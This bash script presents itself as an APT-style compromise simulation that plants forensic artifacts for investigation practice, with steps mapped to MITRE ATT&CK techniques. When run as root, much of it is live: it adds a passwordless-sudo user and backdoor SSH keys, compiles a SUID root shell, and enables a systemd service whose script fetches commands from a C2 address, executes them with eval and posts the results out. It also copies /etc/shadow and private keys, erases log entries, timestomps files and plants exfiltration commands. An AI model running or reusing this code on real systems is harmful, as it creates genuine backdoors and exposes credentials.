#!/bin/bash

# Advanced Compromise Script - Simulates Real-World Attack Scenarios
# Based on actual APT tactics, techniques, and procedures (TTPs)
# DO NOT RUN ON PRODUCTION SYSTEMS!

echo "[+] Starting advanced compromise simulation..."
echo "[+] Simulating APT-style attack campaign..."

# ===== INITIAL ACCESS PHASE =====
echo "[*] Phase 1: Initial Access & Reconnaissance"

# 1. SSH Brute Force Simulation (T1110.001)
echo "  [1.1] Simulating SSH brute force attack traces..."
for i in {1..15}; do
    logger -p auth.warning "sshd[$(shuf -i 1000-9999 -n 1)]: Failed password for root from 203.0.113.$(shuf -i 1-254 -n 1) port $(shuf -i 30000-65000 -n 1) ssh2"
    logger -p auth.warning "sshd[$(shuf -i 1000-9999 -n 1)]: Failed password for admin from 198.51.100.$(shuf -i 1-254 -n 1) port $(shuf -i 30000-65000 -n 1) ssh2"
done

# Successful login after brute force
logger -p auth.info "sshd[$(shuf -i 1000-9999 -n 1)]: Accepted password for webadmin from 203.0.113.42 port 45982 ssh2"

# 2. Create compromised user account (T1136.001)
echo "  [1.2] Creating compromised user account..."
useradd -m -s /bin/bash -G sudo service_account 2>/dev/null
echo "service_account:P@ssw0rd123!" | chpasswd
echo "service_account ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# ===== PERSISTENCE PHASE =====
echo "[*] Phase 2: Establishing Persistence"

# 3. SSH Key Persistence (T1098.004)
echo "  [2.1] Installing SSH backdoor keys..."
mkdir -p /home/webadmin/.ssh
cat << 'EOF' > /home/webadmin/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDw+3FhXbXZQrXaQ6kZQrXaQ6k attacker@malicious-host
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD8xY2fZ3jK9mN5qR7sT9xY2fZ3jK9mN5 persistence@apt-group
EOF
chmod 600 /home/webadmin/.ssh/authorized_keys
chown webadmin:webadmin /home/webadmin/.ssh/authorized_keys

# 4. Systemd Service Persistence (T1543.002)
echo "  [2.2] Creating malicious systemd service..."
cat << 'EOF' > /etc/systemd/system/system-health-monitor.service
[Unit]
Description=System Health Monitoring Service
After=network.target
StartLimitInterval=0

[Service]
Type=simple
ExecStart=/usr/local/bin/health-monitor
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

# Create the malicious binary
cat << 'EOF' > /usr/local/bin/health-monitor
#!/bin/bash
# Fake health monitor - actually a backdoor
while true; do
    # Beacon to C2 server
    curl -s -X POST -d "$(hostname):$(whoami):$(date)" http://198.51.100.42:8080/beacon 2>/dev/null || true
    
    # Check for commands
    cmd=$(curl -s http://198.51.100.42:8080/cmd/$(hostname) 2>/dev/null || echo "")
    if [ ! -z "$cmd" ]; then
        eval "$cmd" > /tmp/.output 2>&1
        curl -s -X POST --data-binary @/tmp/.output http://198.51.100.42:8080/results/$(hostname) 2>/dev/null || true
        rm -f /tmp/.output
    fi
    
    sleep 3600
done
EOF
chmod +x /usr/local/bin/health-monitor

# Enable the service (but don't start to avoid actual network calls)
systemctl enable system-health-monitor.service 2>/dev/null || true

# 5. Cron Job Persistence (T1053.003)
echo "  [2.3] Installing persistent cron jobs..."
cat << 'EOF' >> /etc/crontab
# System maintenance tasks
*/15 * * * * root /usr/local/bin/health-monitor >/dev/null 2>&1
0 3 * * * root /usr/bin/cleanup-logs >/dev/null 2>&1
*/30 * * * * webadmin /home/webadmin/.local/bin/user-sync >/dev/null 2>&1
EOF

# ===== PRIVILEGE ESCALATION PHASE =====
echo "[*] Phase 3: Privilege Escalation"

# 6. SUID Binary Privilege Escalation (T1548.001)
echo "  [3.1] Creating SUID privilege escalation vector..."
cat << 'EOF' > /tmp/privilege-escalator.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF
gcc /tmp/privilege-escalator.c -o /usr/local/bin/system-check 2>/dev/null || echo "GCC not available"
chmod 4755 /usr/local/bin/system-check 2>/dev/null || true
rm -f /tmp/privilege-escalator.c

# 7. Sudo Exploitation (T1548.003)
echo "  [3.2] Exploiting sudo misconfigurations..."
echo "webadmin ALL=(ALL) NOPASSWD:/usr/bin/systemctl" >> /etc/sudoers

# ===== DEFENSE EVASION PHASE =====
echo "[*] Phase 4: Defense Evasion"

# 8. Log Tampering (T1070.002)
echo "  [4.1] Implementing log evasion techniques..."
# Clear specific log entries
sed -i '/Failed password/d' /var/log/auth.log 2>/dev/null || true

# Create fake log entries to hide real activity
logger -p auth.info "sshd[$(shuf -i 1000-9999 -n 1)]: Accepted publickey for webadmin from 192.168.1.100 port 22 ssh2"
logger -p cron.info "CRON[$(shuf -i 1000-9999 -n 1)]: (root) CMD (/usr/bin/updatedb)"

# 9. Timestomping (T1070.006)
echo "  [4.2] Modifying file timestamps..."
touch -t 202301150800.00 /usr/local/bin/health-monitor 2>/dev/null || true
touch -t 202301150800.00 /usr/local/bin/system-check 2>/dev/null || true

# 10. Hidden Files and Directories (T1564.001)
echo "  [4.3] Creating hidden artifacts..."
mkdir -p /tmp/... 2>/dev/null || true
mkdir -p /var/tmp/.cache 2>/dev/null || true
mkdir -p /dev/shm/.work 2>/dev/null || true

# ===== CREDENTIAL ACCESS PHASE =====
echo "[*] Phase 5: Credential Access"

# 11. Password Harvesting (T1003.008)
echo "  [5.1] Simulating credential harvesting..."
mkdir -p /tmp/.../creds
cp /etc/passwd /tmp/.../creds/passwd.backup 2>/dev/null || true
cp /etc/shadow /tmp/.../creds/shadow.backup 2>/dev/null || true

# Create fake credential dump
cat << 'EOF' > /tmp/.../creds/harvested.txt
# Harvested Credentials
admin:P@ssw0rd123
dbuser:mysql_secret_2023
webadmin:webpass123
service_account:P@ssw0rd123!
root:$6$rounds=656000$YQKx.jFzX8GFQlxn$Wd3QfgzwqGUPF0srJn5v3VXjBaG5QPiLf5A0jI8LQCzYfN0JlFy/J.DQwY9dF6T4L5N3dUGzYPm7QwJ8vF2Lm0
EOF

# 12. SSH Key Harvesting (T1552.004)
echo "  [5.2] Harvesting SSH keys..."
find /home -name "id_rsa" -type f 2>/dev/null | while read key; do
    cp "$key" /tmp/.../creds/ 2>/dev/null || true
done

# ===== LATERAL MOVEMENT PHASE =====
echo "[*] Phase 6: Lateral Movement Preparation"

# 13. Network Discovery (T1018)
echo "  [6.1] Simulating network reconnaissance..."
cat << 'EOF' > /tmp/.../network_scan.txt
# Network Reconnaissance Results
192.168.1.1    gateway.local         ICMP REPLY
192.168.1.10   dc01.internal.com     TCP/445 OPEN (SMB)
192.168.1.15   fileserver.local      TCP/22 OPEN (SSH)
192.168.1.20   database.internal     TCP/3306 OPEN (MySQL)
192.168.1.25   webserver.dmz         TCP/80,443 OPEN (HTTP/S)
10.0.0.5       backup.internal       TCP/22,873 OPEN (SSH/RSYNC)
EOF

# 14. Port Scanning Logs (T1046)
echo "  [6.2] Creating port scanning artifacts..."
for i in {1..20}; do
    logger "kernel: TCP: SYN flood from 192.168.1.$(shuf -i 100-200 -n 1) on port $(shuf -i 1-65535 -n 1)"
done

# ===== EXFILTRATION PHASE =====
echo "[*] Phase 7: Data Exfiltration"

# 15. Data Staging (T1074.001)
echo "  [7.1] Staging sensitive data for exfiltration..."
mkdir -p /tmp/.../staged
cat << 'EOF' > /tmp/.../staged/customer_database.sql
-- Customer Database Dump (SIMULATED)
INSERT INTO customers VALUES (1, 'John Doe', 'john.doe@email.com', '555-0123', '123 Main St');
INSERT INTO customers VALUES (2, 'Jane Smith', 'jane.smith@email.com', '555-0456', '456 Oak Ave');
INSERT INTO customers VALUES (3, 'Bob Johnson', 'bob.j@email.com', '555-0789', '789 Pine Rd');
-- 50,000 customer records exported...
EOF

cat << 'EOF' > /tmp/.../staged/employee_data.csv
Name,Email,Department,Salary,SSN
Alice Cooper,alice@company.com,Engineering,95000,123-45-6789
Bob Wilson,bob@company.com,Sales,75000,234-56-7890
Carol Davis,carol@company.com,HR,85000,345-67-8901
Dave Miller,dave@company.com,Finance,90000,456-78-9012
EOF

# 16. Exfiltration Command History (T1041)
echo "  [7.2] Creating exfiltration traces..."
cat << 'EOF' >> /home/webadmin/.bash_history
tar -czf /tmp/backup.tar.gz /home/webadmin/projects/
curl -T /tmp/backup.tar.gz ftp://files.exfil-server.com/upload/
scp -P 2222 /tmp/.../staged/* user@203.0.113.50:/var/incoming/
rsync -avz /var/log/ rsync://backup.malicious.net/logs/
wget --post-file=/etc/passwd http://data.exfil.com/collect
history -c
EOF

# ===== CRYPTO MINING PHASE =====
echo "[*] Phase 8: Cryptocurrency Mining (Real-world financial motivation)"

# 17. Crypto Miner Installation (T1496)
echo "  [8.1] Installing cryptocurrency miner..."
cat << 'EOF' > /usr/local/bin/system-optimizer
#!/bin/bash
# Fake system optimizer - actually XMRig crypto miner
while true; do
    # CPU usage simulation
    stress-ng --cpu 4 --timeout 300s 2>/dev/null || true
    
    # Network activity to mining pool
    curl -s -X POST -H "Content-Type: application/json" \
         -d '{"method":"login","params":{"login":"wallet123","pass":"x","agent":"xmrig/6.18.0"}}' \
         http://pool.supportxmr.com:443/json_rpc 2>/dev/null || true
    
    sleep 600
done
EOF
chmod +x /usr/local/bin/system-optimizer

# Add to startup
echo "@reboot root /usr/local/bin/system-optimizer >/dev/null 2>&1" >> /etc/crontab

# ===== RANSOMWARE SIMULATION PHASE =====
echo "[*] Phase 9: Ransomware Activity Simulation"

# 18. File Encryption Simulation (T1486)
echo "  [9.1] Simulating ransomware file encryption..."
mkdir -p /tmp/.encrypted
for file in /home/webadmin/projects/*; do
    if [ -f "$file" ]; then
        echo "ENCRYPTED_BY_CRYPTOLOCKER" > "${file}.locked" 2>/dev/null || true
    fi
done

# Ransom note
cat << 'EOF' > /home/webadmin/Desktop/DECRYPT_INSTRUCTIONS.txt
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All your important files have been encrypted with RSA-4096 encryption.
To decrypt your files, you need to pay 0.5 Bitcoin to:

Bitcoin Address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2

After payment, contact: decrypt@darkweb.onion

You have 72 hours before the decryption key is deleted forever.

DO NOT RESTART YOUR COMPUTER OR YOUR FILES WILL BE LOST FOREVER!
EOF

# ===== ANTI-FORENSICS PHASE =====
echo "[*] Phase 10: Anti-Forensics Techniques"

# 19. Log Clearing and Manipulation (T1070)
echo "  [10.1] Implementing anti-forensics techniques..."

# Clear bash history for multiple users
history -c 2>/dev/null || true
> /root/.bash_history 2>/dev/null || true
> /home/webadmin/.bash_history 2>/dev/null || true

# Add legitimate-looking entries to hide malicious activity
cat << 'EOF' >> /root/.bash_history
ls -la
cd /var/log
tail -f syslog
systemctl status nginx
ps aux | grep ssh
netstat -tulpn
top
htop
exit
EOF

# 20. File Wiping Simulation (T1070.004)
echo "  [10.2] Simulating secure file deletion..."
# Create evidence of file wiping attempts
echo "shred -vfz -n 3 /tmp/sensitive_data.txt" >> /root/.bash_history
echo "dd if=/dev/urandom of=/tmp/wipe_file bs=1M count=100" >> /root/.bash_history
echo "rm -rf /tmp/wipe_file" >> /root/.bash_history

# ===== FINAL PHASE - INDICATORS =====
echo "[*] Phase 11: Creating Additional Forensic Artifacts"

# 21. Network Indicators (T1071.001)
echo "  [11.1] Creating network communication artifacts..."
echo "198.51.100.42 c2.malicious-domain.com" >> /etc/hosts
echo "203.0.113.50 exfil-server.underground.net" >> /etc/hosts
echo "192.0.2.100 mining-pool.cryptohash.org" >> /etc/hosts

# 22. Browser History Simulation (if browser exists)
echo "  [11.2] Simulating malicious web activity..."
mkdir -p /home/webadmin/.mozilla/firefox/default/
cat << 'EOF' > /home/webadmin/.mozilla/firefox/default/places.sqlite.txt
# Simulated Firefox history
http://darkweb.onion/tools/exploit-kit
http://malware-download.com/payload.exe
http://phishing-site.net/steal-credentials
http://ransomware-payment.onion/decrypt
http://c2-server.evil.com/checkin
EOF

# 23. Download Artifacts
echo "  [11.3] Creating download artifacts..."
mkdir -p /home/webadmin/Downloads
echo "MALICIOUS_PAYLOAD_PLACEHOLDER" > /home/webadmin/Downloads/important_document.pdf.exe
echo "TROJAN_PLACEHOLDER" > /home/webadmin/Downloads/software_crack.zip
touch -t 202310070800.00 /home/webadmin/Downloads/*

# 24. Memory Dump Artifacts
echo "  [11.4] Creating memory artifacts..."
mkdir -p /tmp/.../memory
echo "Process: malicious.exe PID: 1337 PPID: 666" > /tmp/.../memory/suspicious_process.txt
echo "Injected shellcode detected at 0x7f8b8c000000" > /tmp/.../memory/code_injection.txt

echo "[+] Advanced compromise simulation complete!"
echo ""
echo "[+] ATTACK SUMMARY:"
echo "    ==================="
echo "    [✓] Initial Access: SSH Brute Force Attack"
echo "    [✓] Persistence: Multiple mechanisms (SSH keys, systemd, cron)"
echo "    [✓] Privilege Escalation: SUID binaries, sudo exploitation"
echo "    [✓] Defense Evasion: Log tampering, timestomping, hidden files"
echo "    [✓] Credential Access: Password/key harvesting"
echo "    [✓] Lateral Movement: Network reconnaissance"
echo "    [✓] Data Exfiltration: Staged and transferred sensitive data"
echo "    [✓] Cryptocurrency Mining: Resource hijacking"
echo "    [✓] Ransomware: File encryption simulation"
echo "    [✓] Anti-Forensics: Log clearing, file wiping"
echo ""
echo "[+] MITRE ATT&CK TTPs Simulated:"
echo "    T1110.001 - Password Brute Force"
echo "    T1136.001 - Local Account Creation"
echo "    T1098.004 - SSH Authorized Keys"
echo "    T1543.002 - Systemd Service"
echo "    T1053.003 - Cron Job"
echo "    T1548.001 - SUID Escalation"
echo "    T1548.003 - Sudo Exploitation"
echo "    T1070.002 - Log Clearing"
echo "    T1070.006 - Timestomping"
echo "    T1564.001 - Hidden Files"
echo "    T1003.008 - /etc/passwd and /etc/shadow"
echo "    T1552.004 - Private Keys"
echo "    T1018 - Remote System Discovery"
echo "    T1046 - Network Service Scanning"
echo "    T1074.001 - Local Data Staging"
echo "    T1041 - Exfiltration Over C2"
echo "    T1496 - Resource Hijacking"
echo "    T1486 - Data Encrypted for Impact"
echo "    T1070.004 - File Deletion"
echo "    T1071.001 - Web Protocols"
echo ""
echo "[!] System now exhibits realistic APT-style compromise patterns"
echo "[!] Ready for comprehensive forensic investigation"